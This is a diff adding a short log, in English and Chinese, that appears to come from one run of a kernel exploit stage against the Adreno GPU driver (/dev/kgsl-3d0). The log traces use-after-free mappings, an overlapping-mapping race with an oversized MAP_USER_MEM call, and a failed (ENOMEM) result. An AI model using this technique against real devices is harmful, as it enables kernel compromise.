@@ -1,0 +1,20 @@
+[533602.802] === stage_c2 start pid=15112 delay_us=200 ===
+[533609.764] open /dev/kgsl-3d0 OK fd=4
+[533652.361] UAF: ALLOC OK id=1 mmapsize=0x10004000
+[533656.094] OVERLAP: ALLOC OK id=2 mmapsize=0x7000
+[533660.160] UAF mmap OK @0x7001ff000 len=0x10004000
+[533662.888] UAF touch first page 完成
+[533664.481] UAF touch last page 完成
+[533666.660] UAF touch 抽样完成
+[533668.379] UAF munmap 完成
+[533671.105] BOGUS VMA OK @0x700204000
+[533673.654] PLACEHOLDER: ALLOC OK id=3 mmapsize=0x10000
+[533675.446] PLACEHOLDER mmap OK @0x710204000
+[533677.354] racer: 进入 MAP_USER_MEM(hostptr=0x700204000, len=0xffffffffffefd000)
+[533680.661] racer 已启动，等待 200 us 后主线程 mmap OVERLAP
+[533681.280] racer: ioctl 返回 ret=-1 errno=12 (Out of memory)
+[533682.747] 主线程: 进入 mmap(OVERLAP @0x7001fe000 len=0x7000)
+[533684.278] 主线程: mmap 返回 MAP_FAILED errno=12 (Out of memory)
+[533685.551] racer join 完成 ret=-1 errno=12
+[533686.793] 结果: MISS (ENOMEM) (hit 判据为 ENODEV 19)
+[533754.226] 清理完成，退出
